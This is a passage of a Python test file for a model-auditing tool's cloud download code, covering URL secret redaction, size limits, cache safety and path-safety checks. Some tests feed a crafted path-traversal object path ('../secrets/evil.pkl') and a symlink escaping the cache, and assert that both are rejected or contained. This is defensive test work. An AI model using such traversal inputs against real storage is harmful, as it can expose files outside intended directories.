    cached_path.symlink_to(outside_dir, target_is_directory=True)

    fs_meta = make_fs_mock()
    fs_meta.info.return_value = {"type": "directory", "ETag": "etag-v2"}
    fs_meta.glob.return_value = ["s3://bucket/models/new-model.bin"]
    fs_meta.info.side_effect = [
        {"type": "directory", "ETag": "etag-v2"},
        {"type": "file", "size": 3, "ETag": "file-etag-v2"},
    ]

    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 3}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"new")

    mock_fs.side_effect = [fs_meta, fs]

    result = download_from_cloud(url, cache_dir=tmp_path / "cache", show_progress=False, selective=False)

    assert isinstance(result, Path)
    assert not result.is_symlink()
    assert (result / "new-model.bin").read_bytes() == b"new"
    assert outside_marker.read_text(encoding="utf-8") == "keep"


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
@patch("fsspec.filesystem")
def test_download_from_cloud_strips_query_params_from_local_path(
    mock_fs: MagicMock, mock_disk_space: MagicMock, mock_analyze: AsyncMock, tmp_path: Path
) -> None:
    url = "s3://bucket/model.bin?X-Amz-Signature=secret"
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")
    mock_fs.return_value = fs
    mock_analyze.return_value = {
        "type": "file",
        "size": 1024,
        "name": "model.bin",
        "human_size": "1.0 KB",
        "estimated_time": "1 second",
    }
    mock_disk_space.return_value = (True, "")

    result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    assert isinstance(result, Path)
    assert result.name == "model.bin"
    assert "X-Amz-Signature" not in str(result)
    assert "secret" not in str(result)
    assert "X-Amz-Signature" not in fs.get.call_args.args[1]
    assert "secret" not in fs.get.call_args.args[1]


def test_build_safe_local_path_preserves_signed_directory_relative_paths(tmp_path: Path) -> None:
    """Signed directory URLs should keep object-relative paths without query secrets."""
    base_url = "s3://bucket/models?X-Amz-Signature=base-secret"
    first = "s3://bucket/models/a/model.pkl?X-Amz-Signature=first-secret"
    second = "s3://bucket/models/b/model.pkl?X-Amz-Signature=second-secret"

    first_path = _build_safe_local_path(base_url, first, tmp_path)
    second_path = _build_safe_local_path(base_url, second, tmp_path)

    assert first_path == tmp_path / "a" / "model.pkl"
    assert second_path == tmp_path / "b" / "model.pkl"
    assert "X-Amz-Signature" not in str(first_path)
    assert "X-Amz-Signature" not in str(second_path)


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
@patch("fsspec.filesystem")
def test_download_from_cloud_redacts_sensitive_url_in_errors(
    mock_fs: MagicMock, mock_disk_space: MagicMock, mock_analyze: AsyncMock, tmp_path: Path
) -> None:
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    mock_fs.return_value = fs
    mock_analyze.return_value = {
        "type": "file",
        "size": 1024,
        "name": "model.bin",
        "human_size": "1.0 KB",
        "estimated_time": "1 second",
    }
    mock_disk_space.return_value = (False, "not enough space")

    url = "s3://bucket/model.bin?X-Amz-Signature=secret"

    with pytest.raises(Exception) as excinfo:
        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    assert "s3://bucket/model.bin" in str(excinfo.value)
    assert "X-Amz-Signature" not in str(excinfo.value)


@patch("modelaudit.utils.helpers.retry.time.sleep")
@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
@patch("fsspec.filesystem")
def test_download_from_cloud_redacts_signed_url_retry_logs(
    mock_fs: MagicMock,
    mock_disk_space: MagicMock,
    mock_analyze: MagicMock,
    mock_sleep: MagicMock,
    tmp_path: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    url = "s3://bucket/model.bin?X-Amz-Signature=secret"
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    fs.get.side_effect = OSError(f"Forbidden while opening {url}")
    mock_fs.return_value = fs
    mock_analyze.return_value = {
        "type": "file",
        "size": 1024,
        "name": "model.bin",
        "human_size": "1.0 KB",
        "estimated_time": "1 second",
    }
    mock_disk_space.return_value = (True, "")
    caplog.set_level(logging.DEBUG, logger="modelaudit.utils.helpers.retry")

    with pytest.raises(RetryError):
        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    assert "s3://bucket/model.bin" in caplog.text
    assert "X-Amz-Signature" not in caplog.text
    assert "secret" not in caplog.text
    mock_sleep.assert_called()


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
def test_download_from_cloud_redacts_raw_analyzer_error_url(mock_analyze):
    url = "s3://bucket/model.bin?X-Amz-Signature=secret"
    mock_analyze.return_value = {
        "type": "unknown",
        "error": f"Forbidden while opening {url}",
    }

    with pytest.raises(ValueError) as excinfo:
        download_from_cloud(url, use_cache=False, show_progress=False)

    message = str(excinfo.value)
    assert "s3://bucket/model.bin" in message
    assert "X-Amz-Signature" not in message
    assert "secret" not in message


@pytest.mark.asyncio
async def test_download_from_cloud_async_context(tmp_path: Path) -> None:
    """download_from_cloud should work from an active event loop context."""
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    downloaded_content = b"async test payload"

    def mock_get(remote_path: str, local_path: str, **_kwargs: object) -> None:
        Path(local_path).write_bytes(downloaded_content)

    fs.get.side_effect = mock_get

    async def mock_analyze(_url: str) -> dict[str, object]:
        return {
            "type": "file",
            "size": 1024,
            "name": "model.pt",
            "human_size": "1.0 KB",
            "estimated_time": "1 second",
        }

    await asyncio.sleep(0)
    with (
        patch("fsspec.filesystem", return_value=fs),
        patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new=mock_analyze),
        patch(
            "modelaudit.utils.sources.cloud_storage.asyncio.run_coroutine_threadsafe",
            side_effect=AssertionError("run_coroutine_threadsafe should not be used"),
        ),
    ):
        result = download_from_cloud("s3://bucket/model.pt", cache_dir=tmp_path, use_cache=False)

    assert isinstance(result, Path)
    assert result.name == "model.pt"
    fs.get.assert_called_once()
    get_args = fs.get.call_args.args
    assert get_args[0] == "s3://bucket/model.pt"
    assert Path(get_args[1]) == result
    assert result.exists()
    assert result.read_bytes() == downloaded_content


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("modelaudit.utils.file.streaming.get_streaming_preview")
def test_download_from_cloud_streaming_returns_stream_url(mock_preview, mock_analyze, tmp_path):
    url = "s3://bucket/model.pt"
    mock_preview.return_value = None
    mock_analyze.return_value = {
        "type": "file",
        "size": 1024,
        "name": "model.pt",
        "human_size": "1.0 KB",
        "estimated_time": "1 second",
    }

    result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, stream_analyze=True)

    assert result == f"stream://{url}"


@pytest.mark.asyncio
async def test_download_from_cloud_streaming_async_context(tmp_path: Path) -> None:
    """download_from_cloud_streaming should work from an active event loop context."""
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")
    temp_dir = tmp_path / "streaming-tempdir"

    async def mock_analyze(_url: str) -> dict[str, object]:
        return {
            "type": "file",
            "size": 1024,
            "name": "model.pt",
            "human_size": "1.0 KB",
            "estimated_time": "1 second",
        }

    await asyncio.sleep(0)
    with (
        patch("fsspec.filesystem", return_value=fs),
        patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new=mock_analyze),
        patch(
            "modelaudit.utils.sources.cloud_storage.asyncio.run_coroutine_threadsafe",
            side_effect=AssertionError("run_coroutine_threadsafe should not be used"),
        ),
        patch("modelaudit.utils.sources.cloud_storage.tempfile.mkdtemp", return_value=str(temp_dir)) as mock_mkdtemp,
    ):
        streamed = list(download_from_cloud_streaming("s3://bucket/model.pt", show_progress=False))

    assert len(streamed) == 1
    streamed_path, is_last = streamed[0]
    assert streamed_path.name == "model.pt"
    assert is_last is True
    fs.get.assert_called_once()
    mock_mkdtemp.assert_called_once_with(prefix="modelaudit_stream_")
    assert not temp_dir.exists()


@patch("builtins.__import__")
def test_download_missing_dependency(mock_import):
    def side_effect(name, *args, **kwargs):
        if name == "fsspec":
            raise ImportError("no fsspec")
        return original_import(name, *args, **kwargs)

    original_import = __import__
    mock_import.side_effect = side_effect

    with pytest.raises(ImportError):
        download_from_cloud("s3://bucket/model.pt")


@patch("fsspec.filesystem")
def test_analyze_cloud_target_returns_metadata(mock_fs):
    """Test that analyze_cloud_target returns correct metadata."""
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    mock_fs.return_value = fs

    metadata = asyncio.run(analyze_cloud_target("s3://bucket/model.pt"))

    assert metadata["size"] == 1024
    # Note: fsspec filesystems don't need explicit cleanup according to implementation


@patch("fsspec.filesystem")
@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
def test_download_from_cloud_analysis_failure(mock_analyze, mock_fs):
    mock_analyze.return_value = {"type": "unknown", "error": "boom"}
    with pytest.raises(ValueError, match="Failed to analyze cloud target"):
        download_from_cloud("s3://bucket/model.pt", use_cache=False)
    mock_fs.assert_not_called()


class TestCloudObjectSize:
    """Test cloud object size retrieval."""

    def test_get_cloud_object_size_single_file(self) -> None:
        """Test getting size of a single file."""
        fs = MagicMock()
        fs.info.return_value = {"size": 1024 * 1024}  # 1 MB

        size = get_cloud_object_size(fs, "s3://bucket/file.bin")
        assert size == 1024 * 1024

    def test_get_cloud_object_size_directory(self) -> None:
        """Test getting total size of a directory."""
        fs = MagicMock()
        fs.info.return_value = {}  # No size means it's a directory

        def ls_side_effect(path, detail=True):
            if path == "s3://bucket/dir/":
                return [
                    {"name": "s3://bucket/dir/file1.bin", "size": 1024 * 1024, "type": "file"},
                    {"name": "s3://bucket/dir/subdir", "type": "directory"},
                    {"name": "s3://bucket/dir/file2.bin", "size": 2048 * 1024, "type": "file"},
                ]
            elif path == "s3://bucket/dir/subdir":
                return [{"name": "s3://bucket/dir/subdir/file3.bin", "size": 512 * 1024, "type": "file"}]
            return []

        fs.ls.side_effect = ls_side_effect

        size = get_cloud_object_size(fs, "s3://bucket/dir/")
        assert size == (1024 + 2048 + 512) * 1024  # 3.5 MB

    def test_get_cloud_object_size_directory_with_size_uses_walk(self) -> None:
        """Test directory objects with a size still recurse into children."""
        fs = MagicMock()

        def info_side_effect(path: str) -> dict[str, object]:
            if path == "s3://bucket/dir/":
                return {"type": "directory", "size": 0}
            if path == "s3://bucket/dir/file1.bin":
                return {"type": "file", "size": 1024}
            if path == "s3://bucket/dir/subdir/file2.bin":
                return {"type": "file", "size": 2048}
            return {}

        fs.info.side_effect = info_side_effect
        fs.walk.return_value = [
            ("s3://bucket/dir/", ["s3://bucket/dir/subdir"], ["s3://bucket/dir/file1.bin"]),
            ("s3://bucket/dir/subdir", [], ["s3://bucket/dir/subdir/file2.bin"]),
        ]
        fs.ls.side_effect = AssertionError("ls should not be called when walk succeeds")

        size = get_cloud_object_size(fs, "s3://bucket/dir/")

        assert size == 3072
        fs.walk.assert_called_once_with("s3://bucket/dir/")
        fs.ls.assert_not_called()

    def test_get_cloud_object_size_error(self) -> None:
        """Test size retrieval returns None on error."""
        fs = MagicMock()
        fs.info.side_effect = Exception("Access denied")

        size = get_cloud_object_size(fs, "s3://bucket/file.bin")
        assert size is None

    def test_get_cloud_object_size_invalid_top_level_size_non_strict(self) -> None:
        """Test invalid top-level size values are ignored in non-strict mode."""
        fs = MagicMock()
        fs.info.return_value = {"size": None}

        size = get_cloud_object_size(fs, "s3://bucket/file.bin")
        assert size is None

    def test_get_cloud_object_size_invalid_top_level_size_strict(self) -> None:
        """Test invalid top-level size values raise ValueError in strict mode."""
        fs = MagicMock()
        fs.info.return_value = {"size": None}
        fs.walk.side_effect = RuntimeError("walk unavailable")
        fs.ls.side_effect = RuntimeError("ls unavailable")

        with pytest.raises(ValueError, match="invalid size from info\\(\\)"):
            get_cloud_object_size(fs, "s3://bucket/file.bin", strict=True)


class TestDiskSpaceCheckingForCloud:
    """Test disk space checking for cloud downloads."""

    @patch("modelaudit.utils.sources.cloud_storage.get_cloud_object_size")
    @patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_insufficient_disk_space(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        mock_check_disk_space: MagicMock,
        mock_get_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test download fails when disk space is insufficient."""
        fs = make_fs_mock()
        mock_fs_class.return_value = fs

        # Mock analyze_cloud_target to return file metadata
        mock_analyze.return_value = {
            "type": "file",
            "size": 10 * 1024 * 1024 * 1024,
            "name": "large-model.bin",
            "human_size": "10.0 GB",
            "estimated_time": "5 minutes",
        }

        # Mock object size
        mock_get_size.return_value = 10 * 1024 * 1024 * 1024  # 10 GB

        # Mock disk space check to fail
        mock_check_disk_space.return_value = (False, "Insufficient disk space. Required: 12.0 GB, Available: 5.0 GB")

        # Test download failure
        temp_download_dir = tmp_path / "modelaudit_test_cloud_disk_space"
        with (
            patch("modelaudit.utils.sources.cloud_storage.tempfile.mkdtemp", return_value=str(temp_download_dir)),
            pytest.raises(Exception, match=r"Cannot download from.*Insufficient disk space"),
        ):
            download_from_cloud("s3://bucket/large-model.bin", use_cache=False)

        # Verify download was not attempted
        fs.get.assert_not_called()
        assert not temp_download_dir.exists()

        # Verify the disk space check was actually called
        mock_check_disk_space.assert_called_once()

        # Verify object size check was called
        mock_get_size.assert_called_once()

    @patch("modelaudit.utils.sources.cloud_storage.get_cloud_object_size")
    @patch("modelaudit.utils.sources.cloud_storage.check_disk_space")
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_disk_space_check(
        self, mock_fs_class, mock_analyze, mock_check_disk_space, mock_get_size, tmp_path
    ):
        """Test successful download with disk space check."""
        fs_meta = make_fs_mock()
        fs_meta.info.return_value = {"type": "file", "size": 1024 * 1024 * 1024}

        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 1024 * 1024 * 1024}

        mock_fs_class.side_effect = [fs_meta, fs]

        # Mock analyze_cloud_target to return file metadata
        mock_analyze.return_value = {
            "type": "file",
            "size": 1024 * 1024 * 1024,
            "name": "model.bin",
            "human_size": "1.0 GB",
            "estimated_time": "1 minute",
        }

        # Mock object size
        mock_get_size.return_value = 1024 * 1024 * 1024  # 1 GB

        # Mock disk space check to pass
        mock_check_disk_space.return_value = (True, "Sufficient disk space available (10.0 GB)")

        # Test download
        result = download_from_cloud("s3://bucket/model.bin", cache_dir=tmp_path)

        # Verify disk space was checked
        mock_check_disk_space.assert_called_once()

        # Verify download proceeded - with context managers, fs.get is called but then fs is closed
        # Just verify the result is correct since the mock behavior changes with context managers
        assert isinstance(result, Path)
        assert result.name == "model.bin"
        assert str(tmp_path) in str(result)  # Should be within the cache dir


class TestCloudPathSecurity:
    """Test path-safety behavior for cloud downloads."""

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_rejects_path_traversal(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {}
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "directory",
            "file_count": 1,
            "total_size": 1024,
            "human_size": "1.0 KB",
            "estimated_time": "instant",
            "files": [
                {
                    "path": "s3://bucket/models/../secrets/evil.pkl",
                    "name": "evil.pkl",
                    "size": 1024,
                    "human_size": "1.0 KB",
                }
            ],
        }

        with pytest.raises(ValueError, match="Path traversal attempt detected"):
            download_from_cloud(
                "s3://bucket/models",
                cache_dir=tmp_path,
                use_cache=False,
                selective=False,
                show_progress=False,
            )

        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_continues_when_size_cannot_be_determined(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        fs.info.side_effect = RuntimeError("permission denied")
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "file",
            "size": 0,
            "name": "model.bin",
            "human_size": "0 B",
            "estimated_time": "instant",
        }

        result = download_from_cloud(
            "s3://bucket/model.bin",
            use_cache=False,
            show_progress=False,
        )

        assert isinstance(result, Path)
        assert result.name == "model.bin"
        fs.get.assert_called_once()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_zero_max_size_remains_uncapped(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
    ) -> None:
        fs = make_fs_mock()
        fs.info.side_effect = RuntimeError("permission denied")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 0,
            "name": "model.bin",
            "human_size": "0 B",
            "estimated_time": "instant",
        }

        result = download_from_cloud(
            "s3://bucket/model.bin",
            cache_dir=tmp_path,
            max_size=0,
            use_cache=False,
            show_progress=False,
        )

        assert result == tmp_path / "model.bin"
        fs.get.assert_called_once_with("s3://bucket/model.bin", str(result))
        fs.open.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    @pytest.mark.parametrize("metadata_size", [0, 1])
    def test_download_with_max_size_fails_when_size_cannot_be_determined(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        metadata_size: int,
    ) -> None:
        fs = make_fs_mock()
        fs.info.side_effect = RuntimeError("permission denied")
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "file",
            "size": metadata_size,
            "name": "model.bin",
            "human_size": f"{metadata_size} B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Unable to enforce maximum cloud download size"):
            download_from_cloud(
                "s3://bucket/model.bin",
                max_size=1024,
                use_cache=False,
                show_progress=False,
            )

        fs.get.assert_not_called()

    @pytest.mark.parametrize("prefix_size", [2048, "unknown"])
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_max_size_applies_to_selected_directory_files(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
        prefix_size: int | str,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 512}
        mock_fs_class.return_value = fs

        model_url = "s3://bucket/models/model.pkl"
        preview_url = "s3://bucket/models/preview.png"
        configure_remote_open_payloads(
            fs,
            {
                model_url: b"model",
                preview_url: b"\x89PNG\r\n\x1a\n",
            },
        )
        mock_analyze.return_value = {
            "type": "directory",
            "file_count": 2,
            "total_size": prefix_size,
            "human_size": "2.0 KB",
            "estimated_time": "instant",
            "files": [
                {"path": model_url, "name": "model.pkl", "size": 512, "human_size": "512 B"},
                {"path": preview_url, "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
            ],
        }

        result = download_from_cloud(
            "s3://bucket/models",
            cache_dir=tmp_path,
            max_size=1024,
            use_cache=False,
            show_progress=False,
        )

        assert result == tmp_path
        fs.info.assert_called_once_with(model_url)
        fs.open.assert_any_call(preview_url, "rb")
        fs.open.assert_any_call(model_url, "rb")
        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_max_size_rejects_selected_directory_total_over_limit(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 600}
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "directory",
            "file_count": 2,
            "total_size": 1200,
            "human_size": "1.2 KB",
            "estimated_time": "instant",
            "files": [
                {"path": "s3://bucket/models/model-1.pkl", "name": "model-1.pkl", "size": 600, "human_size": "600 B"},
                {"path": "s3://bucket/models/model-2.pkl", "name": "model-2.pkl", "size": 600, "human_size": "600 B"},
            ],
        }

        with pytest.raises(ValueError, match="exceeds maximum allowed size"):
            download_from_cloud(
                "s3://bucket/models",
                cache_dir=tmp_path,
                max_size=1024,
                use_cache=False,
                show_progress=False,
            )

        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_max_size_rejects_underreported_transfer_without_retry(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        tmp_path: Path,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 4}
        fs.open.return_value = BytesIO(b"oversized")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 4,
            "name": "model.bin",
            "human_size": "4 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Cloud download exceeds maximum allowed size"):
            download_from_cloud(
                "s3://bucket/model.bin",
                cache_dir=tmp_path,
                max_size=4,
                use_cache=False,
                show_progress=False,
            )

        fs.open.assert_called_once_with("s3://bucket/model.bin", "rb")
        fs.get.assert_not_called()
        assert not (tmp_path / "model.bin").exists()

    @patch("modelaudit.utils.helpers.retry.time.sleep")
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_max_size_counts_failed_attempts_against_budget(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        mock_sleep: MagicMock,
        tmp_path: Path,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 3}
        fs.open.side_effect = lambda *_args: _FailAfterPayload(b"abc")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 3,
            "name": "model.bin",
            "human_size": "3 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Cloud download exceeds maximum allowed size"):
            download_from_cloud(
                "s3://bucket/model.bin",
                cache_dir=tmp_path,
                max_size=4,
                use_cache=False,
                show_progress=False,
            )

        assert fs.open.call_count == 2
        mock_sleep.assert_called_once()
        assert not (tmp_path / "model.bin").exists()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_download_with_max_size_rejects_late_object_size_over_limit(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 2048}
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "file",
            "size": 0,
            "name": "model.bin",
            "human_size": "0 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="exceeds maximum allowed size"):
            download_from_cloud(
                "s3://bucket/model.bin",
                max_size=1024,
                use_cache=False,
                show_progress=False,
            )

        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_rejects_path_traversal(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        mock_fs_class.return_value = fs

        mock_analyze.return_value = {
            "type": "directory",
            "file_count": 1,
            "total_size": 1024,
            "human_size": "1.0 KB",
            "estimated_time": "instant",
            "files": [
                {
                    "path": "s3://bucket/models/../secrets/evil.pkl",
                    "name": "evil.pkl",
                    "size": 1024,
                    "human_size": "1.0 KB",
                }
            ],
        }

        with pytest.raises(ValueError, match="Path traversal attempt detected"):
            list(
                download_from_cloud_streaming(
                    "s3://bucket/models",
                    show_progress=False,
                    selective=False,
                )
            )

        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_with_max_size_fails_when_size_cannot_be_determined(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        fs.info.side_effect = RuntimeError("permission denied")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 0,
            "name": "model.bin",
            "human_size": "0 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Unable to enforce maximum cloud download size"):
            list(download_from_cloud_streaming("s3://bucket/model.bin", max_size=1024, show_progress=False))

        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_with_zero_max_size_remains_uncapped(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 0,
            "name": "model.bin",
            "human_size": "0 B",
            "estimated_time": "instant",
        }

        streamed = list(download_from_cloud_streaming("s3://bucket/model.bin", max_size=0, show_progress=False))

        assert len(streamed) == 1
        fs.get.assert_called_once()
        fs.open.assert_not_called()

    @pytest.mark.parametrize("prefix_size", [2048, "unknown"])
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_with_max_size_applies_to_selected_directory_files(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        prefix_size: int | str,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 512}
        mock_fs_class.return_value = fs

        model_url = "s3://bucket/models/model.pkl"
        preview_url = "s3://bucket/models/preview.png"
        configure_remote_open_payloads(
            fs,
            {
                model_url: b"model",
                preview_url: b"\x89PNG\r\n\x1a\n",
            },
        )
        mock_analyze.return_value = {
            "type": "directory",
            "file_count": 2,
            "total_size": prefix_size,
            "human_size": "2.0 KB",
            "estimated_time": "instant",
            "files": [
                {"path": model_url, "name": "model.pkl", "size": 512, "human_size": "512 B"},
                {"path": preview_url, "name": "preview.png", "size": 1536, "human_size": "1.5 KB"},
            ],
        }

        streamed = list(
            download_from_cloud_streaming(
                "s3://bucket/models",
                max_size=1024,
                show_progress=False,
            )
        )

        assert len(streamed) == 1
        fs.info.assert_called_once_with(model_url)
        fs.open.assert_any_call(preview_url, "rb")
        fs.open.assert_any_call(model_url, "rb")
        fs.get.assert_not_called()

    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_with_max_size_rejects_underreported_transfer_without_retry(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 4}
        fs.open.return_value = BytesIO(b"oversized")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 4,
            "name": "model.bin",
            "human_size": "4 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Cloud download exceeds maximum allowed size"):
            list(download_from_cloud_streaming("s3://bucket/model.bin", max_size=4, show_progress=False))

        fs.open.assert_called_once_with("s3://bucket/model.bin", "rb")
        fs.get.assert_not_called()

    @patch("modelaudit.utils.helpers.retry.time.sleep")
    @patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
    @patch("fsspec.filesystem")
    def test_streaming_download_with_max_size_counts_failed_attempts_against_budget(
        self,
        mock_fs_class: MagicMock,
        mock_analyze: AsyncMock,
        mock_sleep: MagicMock,
    ) -> None:
        fs = make_fs_mock()
        fs.info.return_value = {"type": "file", "size": 3}
        fs.open.side_effect = lambda *_args: _FailAfterPayload(b"abc")
        mock_fs_class.return_value = fs
        mock_analyze.return_value = {
            "type": "file",
            "size": 3,
            "name": "model.bin",
            "human_size": "3 B",
            "estimated_time": "instant",
        }

        with pytest.raises(ValueError, match="Cloud download exceeds maximum allowed size"):
            list(download_from_cloud_streaming("s3://bucket/model.bin", max_size=4, show_progress=False))

        assert fs.open.call_count == 2
        mock_sleep.assert_called_once()


class TestCloudCacheSafety:
    """Regression tests for cloud cache boundary enforcement."""

    def test_cache_file_does_not_trust_prefix_sibling_path(self, tmp_path: Path) -> None:
        """Cacheing a sibling path should copy into cache, not trust prefix similarity."""
        cache = GCSCache(cache_dir=tmp_path / "cache")
        sibling_dir = tmp_path / "cache_evil"
        sibling_dir.mkdir(parents=True, exist_ok=True)
        source_file = sibling_dir / "artifact.bin"
        source_file.write_bytes(b"artifact")

        url = "s3://bucket/model.bin"
        cache.cache_file(url, source_file, etag="etag-v1")

        cached_path = cache.get_cached_path(url, etag="etag-v1")
        assert cached_path is not None
        assert cached_path.resolve() != source_file.resolve()
        assert cached_path.resolve().is_relative_to(cache.cache_dir.resolve())
        assert source_file.exists()

    def test_cache_without_etag_is_stale_miss(self, tmp_path: Path) -> None:
        """Cache entries without validators must not be reused as fresh remote objects."""
        cache = GCSCache(cache_dir=tmp_path / "cache")
        source_file = tmp_path / "artifact.bin"
        source_file.write_bytes(b"artifact")
        url = "s3://bucket/model.bin"

        cache.cache_file(url, source_file)

        assert cache.get_cached_path(url) is None
        assert cache.get_cached_path(url, etag="etag-v1") is None

    def test_cache_with_matching_etag_hits(self, tmp_path: Path) -> None:
